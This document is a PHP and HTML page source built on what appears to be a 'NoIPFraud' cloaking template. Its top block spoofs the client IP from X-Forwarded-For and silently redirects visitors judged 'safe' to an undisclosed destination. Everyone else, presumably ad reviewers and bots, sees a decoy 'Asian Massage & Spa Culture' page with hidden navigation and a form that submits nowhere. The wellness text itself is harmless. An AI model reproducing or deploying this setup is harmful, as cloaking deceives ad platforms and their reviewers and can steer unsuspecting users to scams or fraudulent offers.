<?php
if ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
	$_SERVER['REMOTE_ADDR'] = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
	unset($GLOBALS['_SERVER']['HTTP_X_FORWARDED_FOR']);

	if ( isset($_SERVER['HTTP_CLIENT_IP']) ) {
		unset($GLOBALS['_SERVER']['HTTP_CLIENT_IP']);
	}
}
//WARNING: ADVANCED NOIPFRAUD TEMPLATE
//define critical variables - do not change!
define('APPLOC','/var/www/noipfraud/api/');
$_GET['clid'] = 'sqo3n415';
include(APPLOC.'go.php');
if ( $isItSafe ) {
	//visitor safe - redirect
	noIpFraud();
}
//include your safe landing page below the next line

?>  
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100..900;1,100..900&display=swap"
      rel="stylesheet"
    />
    <title>Asian Massage & Spa Culture</title>
  </head>
  <body>
    <header style="display: none">
      <div class="header-wrapper">
        <div class="header-body">
          <div class="header-logo">
            <a href="/"
              ><img
                src="https://soft-touch4u.com/images/199/8383538/LogoSoftTouch4u1.png"
            /></a>
          </div>
          <div class="header-menu">
            <ul class="header-menu-list">
              <li class="header-menu-link">
                <a class="" href="/">HOME</a>
              </li>
              <li class="header-menu-link">
                <a class="" href="/about">About</a>
              </li>
              <li class="header-menu-link">
                <a class="" href="/contact">Contact</a>
              </li>
            </ul>
          </div>
          <div class="header-menu-button">
            <div class="header-menu-button-body">
              <div class="menu-trigger-button">
                <div class="menu-trigger-box">
                  <div class="menu-trigger-inner"></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </header>

    <div class="app__content">
      <div class="app__container">
        <h1 class="ta-centr">Asian Massage & Spa Culture</h1>

        <p class="ta-centr">
          In ancient Asian cultures, what we call "wellness" was a way of life
        </p>

        <p class="ta-centr">
          Massage and meditation, mind, body, spirit - explore it with us!
        </p>
      </div>

      <div class="form-container">
        <form action="" class="contact-form">
          <div class="contact-title">
            <h2>CONTACT US</h2>
            <hr />
          </div>
          <input
            type="text"
            name="name"
            placeholder="Your Name"
            class="contact-inputs"
            required
          />
          <input
            type="email"
            name="email"
            placeholder="Your Email"
            class="contact-inputs"
            required
          />
          <button type="submit">SUBMIT</button>
        </form>
      </div>

      <div class="app__content-block ta-centr">
        <h3>Royal Thai Massage</h3>

        <p>
          One of the most renowned elements of Asian spa and massage culture is
          the practice of traditional Thai massage. Originating in Thailand over
          2,500 years ago, this ancient healing art combines acupressure,
          stretching, and yoga-like poses to alleviate tension, improve
          circulation, and promote overall wellness. Thai massage is often
          performed on a mat on the floor, with the recipient fully clothed,
          making it accessible to people of all ages and physical abilities.
        </p>

        <img src="https://drive.google.com/file/d/1L1q30bSYhkRgy1334Qh9LuOjexXI_OPG/view?usp=drive_link" alt="" class="app__cover-img" />
      </div>
      <div class="app__content-block ta-centr">
        <h3>Tradition of Onsen</h3>

        <p>
          In Japan, the tradition of onsen, or hot spring bathing, holds a
          special place in the hearts of locals and travelers alike. With
          thousands of natural hot springs scattered across the country, onsen
          bathing is not only a means of relaxation but also a cultural
          experience steeped in history and tradition. The mineral-rich waters
          are believed to have therapeutic properties, offering relief from
          ailments such as arthritis, muscle pain, and fatigue.
        </p>
        <img src="/img/blogphoto2.jpg" alt="" />
      </div>
      <div class="app__content-block ta-centr">
        <h3>Vietnam's Wonderful Wellness</h3>

        <p>
          Across Southeast Asia, from Indonesia to Vietnam, traditional spa
          treatments draw inspiration from indigenous healing traditions and
          local ingredients. Balinese massages, for example, incorporate
          techniques such as long, flowing strokes and gentle kneading to soothe
          tired muscles and promote relaxation. Meanwhile, Vietnamese spas offer
          herbal baths, body scrubs, and facials using ingredients like
          lemongrass, ginger, and coconut, known for their purifying and
          nourishing properties.
        </p>

        <img src="/img/blogphoto3.jpg" alt="" />

        <p>
          In recent years, the popularity of Asian spa and massage culture has
          transcended borders, with wellness seekers from around the globe
          flocking to renowned destinations such as Thailand, Bali, and India to
          experience the healing power of ancient traditions firsthand.
          Moreover, the integration of Eastern wellness practices into Western
          spa settings has led to a fusion of techniques and philosophies,
          offering a diverse array of treatments that cater to a modern
          audience.
        </p>
      </div>
    </div>

    <footer class="footer-wrapper" style="display: none">
      <div class="footer-container">
        <ul class="footer-list">
          <li class="footer-link">
            <a href="/privacy">Privacy Policy</a>
          </li>
        </ul>
      </div>
    </footer>

    <script>
      document
        .querySelector(".menu-trigger-button")
        .addEventListener("click", () => {
          document
            .querySelector(".header-menu-button")
            .classList.toggle("open");
          document.querySelector(".header-menu").classList.toggle("open");
        });
    </script>
  </body>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    .ta-centr {
      text-align: center;
    }

    body {
      background-color: #f2f2f2;
      font-family: Arial, Helvetica, sans-serif;
    }

    .app__container {
      max-width: 900px;
      margin: 0 auto;
    }

    .app__header {
      background-color: #000;
    }

    .app__logo {
      max-width: 160px;
    }

    .app__content {
      margin: 25px auto;
      background-color: #fff;
      border-radius: 10px;
      max-width: 920px;
      padding: 30px 25px 30px 25px;
    }

    h1 {
      font-size: 44px;
      line-height: 50px;
      font-weight: 300 !important;
    }

    p {
      font-size: 16px;
      line-height: 28px;
      font-weight: 200;
      margin: 10px 0;
    }

    .app__cover-img {
      border-radius: 10px;
      width: 100%;
      margin-top: 15px;
    }

    .app__content-block {
      margin-top: 15px;
    }

    .app__content-block h3 {
      text-align: center;

      font-size: 28px;
      line-height: 38px;
      margin: 0 0 20px 0;
      font-weight: lighter;
    }

    .app__content-block img {
      display: block;
      margin: 0 auto;
      border-radius: 15px;
      max-width: 100%;
    }

    .app__content-block p {
      margin-top: 10px;
    }

    .app__accent {
      color: #998255;
      text-decoration: underline;
    }

    @media (max-width: 768px) {
      h1 {
        font-size: 38px;
        line-height: 42px;
      }

      p {
        font-size: 14px;
        line-height: 18px;
      }
    }

    @media (max-width: 550px) {
      h1 {
        font-size: 22px;
        line-height: 36px;
      }

      .app__content-block h3 {
        font-size: 18px;
        line-height: 24px;
      }
    }

    .form-container {
      margin: 20px 0;
    }

    .contact-form {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }

    .contact-title {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .contact-title h2 {
      font-weight: 600;
      font-size: 30px;
      margin-bottom: 5px;
    }

    .contact-title hr {
      border: none;
      background-color: #000;
      width: 100px;
      height: 5px;
      border-radius: 10px;
      margin-bottom: 5px;
    }

    .contact-inputs {
      max-width: 500px;
      width: 100%;
      height: 50px;
      border: none;
      outline: none;
      padding-left: 25px;
      font-weight: 500;
      color: #666;
      border-radius: 50px;
      border: 1px solid #666;
    }

    .contact-inputs:focus {
      border: 1px solid #0f0f0f;
    }

    .contact-inputs::placeholder {
      color: #a9a9a9;
    }

    .contact-form button {
      display: flex;
      align-items: center;
      padding: 15px 30px;
      font-size: 16px;
      color: #fff;
      gap: 10px;
      border: none;
      border-radius: 50px;
      background: linear-gradient(270deg, #8d1212, #262323);
      cursor: pointer;
    }
  </style>
  <style>
    .header-wrapper {
      width: 100%;
      top: 0;
      left: 0;
      z-index: 4;
      box-shadow: 2px 2px 4px 0 rgba(0, 0, 0, 0.2);
      background: #2f2f2f;
    }

    .header-body {
      justify-content: space-between;
      align-items: center;
      padding: 1rem;

      align-content: flex-start;
      display: flex;
      flex: 1 0 auto;
      flex-wrap: wrap;
      position: relative;
      width: 100%;

      max-width: 75rem;
      margin-left: auto;
      margin-right: auto;
    }

    .header-logo {
      width: 100px;
      height: auto;
    }

    .header-logo img {
      width: 100px;
      height: auto;
    }

    .header-menu {
      flex-basis: auto;
      flex-grow: 1;
    }

    .header-menu.open {
      transform: translate3d(0, 0, 0);
      pointer-events: auto;
      opacity: 1;
    }

    @media (max-width: 60.9375rem) {
      .header-menu {
        background: #2f2f2f;
        display: flex;
        align-items: center;
        justify-content: center;
        text-align: center;
        overflow-y: auto;
        position: fixed;
        top: 0;
        z-index: 4;
        pointer-events: none;
        opacity: 0;
        transform: translate3d(0, -100%, 0);
        transition: all 0.5s cubic-bezier(0.16, 0, 0.28, 0.99);
        max-width: 100%;
        height: 100%;
        width: 100%;
        left: 0;
      }
    }

    .header-menu-list {
      justify-content: flex-end;
      display: flex;
      text-align: right;

      list-style: none;
      padding: 0;
      margin: 0;
    }

    @media (max-width: 60.9375rem) {
      .header-menu-list {
        padding: 1rem;
        max-height: 100%;
        display: block;
        text-align: center;
      }
    }

    .header-menu-link a {
      padding: 1rem 0rem 1rem 0rem;
      font-size: 1rem;

      color: #f4f4f4;

      font-family: "Raleway";
      letter-spacing: 2px;
      transition: all 1s;

      margin: 0;
      display: inline-block;
      text-decoration: none;
      text-transform: uppercase;
      font-weight: 300;
      font-style: normal;
      position: relative;
      box-sizing: border-box;
      z-index: 10;
      line-height: 1;
    }

    @media (max-width: 60.9375rem) {
      .header-menu-link a {
        font-size: 1.3rem;
      }
    }

    .header-menu-link a::before {
      content: "";
      position: absolute;
      display: block;
      z-index: -1;
      transition: all 0.3s ease;
      background: #fff;

      height: 1px;
      width: 100%;
      top: 0;
      left: 0;
      opacity: 0;

      top: 50%;

      right: -5px;
    }

    .header-menu-link a:hover::before {
      opacity: 1;
      transform: translateY(0);
      background: #fff;
    }

    @media screen and (min-width: 61rem) {
      .header-menu-link:not(:first-child) {
        margin: 0 0 0 2rem;
      }
    }

    @media screen and (max-width: 60.9375rem) {
      .header-menu-link:not(:last-child) {
        margin: 0 0 2rem 0;
      }
    }

    .header-menu-button {
      flex-grow: 1;
      flex-basis: auto;
    }

    @media screen and (min-width: 61rem) {
      .header-menu-button {
        display: none;
      }
    }

    @media screen and (max-width: 975px) {
      .header-menu-button-body {
        justify-content: flex-end;
        place-content: center flex-end;
        align-items: center;
        overflow: visible;

        display: flex;
        flex: 1 0 auto;
        flex-wrap: wrap;
        position: relative;
        width: 100%;
      }
    }

    .menu-trigger-button {
      flex-basis: auto;
      border-color: #fff;
      padding: 0px;

      border-width: 1px;
      border-style: none;
      border-radius: 0;
      transition: all 0.3s ease-in-out;
      transition-property: opacity;
      opacity: 1;
      z-index: 101;
      cursor: pointer;
      position: relative;
      line-height: 0;
    }

    .menu-trigger-box {
      height: calc(8px * 2 + 1px * 3);
      width: 30px;
      transform: scale(1);
      display: inline-block;
      position: relative;
      cursor: pointer;
      line-height: 0;
    }

    .menu-trigger-inner {
      display: block;
      margin-top: calc(1px / -2);

      width: 30px;

      border-radius: 0;
      background-color: #fff;
      position: absolute;
      transition-property: transform, width, margin-left;
      transition-duration: 0.15s;
      transition-timing-function: ease;

      cursor: pointer;
      line-height: 0;
    }

    .menu-trigger-inner:before {
      top: calc(1px + 8px);
      background: #fff;
      transition-property: transform, opacity, width, margin-left;
      transition-timing-function: ease;
      transition-duration: 0.15s;
      content: "";
      display: block;
      height: 1px;
      width: 30px;
      border-radius: 0;
      position: absolute;
      line-height: 0;
      cursor: pointer;
    }

    .menu-trigger-inner:after {
      background: #fff;
      top: calc(1px * 2 + 8px * 2);
      bottom: calc((8px + 1px) * -1);
      content: "";
      display: block;
      height: 1px;
      width: 30px;
      border-radius: 0;
      position: absolute;
      transition-property: transform, width, margin-left;
      transition-duration: 0.15s;
      transition-timing-function: ease;
    }

    .header-menu-button.open {
      border-color: #fff;
      opacity: 1;
      position: fixed;
      top: 2vw;
      left: 50%;
      right: auto;
      transform: translateX(-50%);
      position: fixed;
      z-index: 4;
    }

    .header-menu-button.open .menu-trigger-inner {
      transform: translate3d(0, calc(8px + 1px), 0) rotate(45deg);
    }

    .header-menu-button.open .menu-trigger-inner:before {
      opacity: 0;
    }

    .header-menu-button.open .menu-trigger-inner:after {
      transform: translate3d(0, calc((8px + 1px) * -2), 0) rotate(-90deg);
    }

    @media screen and (max-width: 60.9375rem) {
      .menu-trigger-inner {
        top: calc(1px / 2);
        height: 1px;
      }
    }

    .footer-wrapper {
      background: #2c2c2c;
      font-family: "Raleway";
    }

    .footer-container {
      max-width: 75rem;
      margin-left: auto;
      margin-right: auto;
      padding: 1rem;
    }

    .footer-list {
      margin: 0.5rem;
      list-style: none;
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
      justify-content: center;
    }

    .footer-link a {
      color: #fff;
      text-decoration: none;
      background-color: transparent;
      transition: all 0.3s ease-in-out;
    }
  </style>
</html>
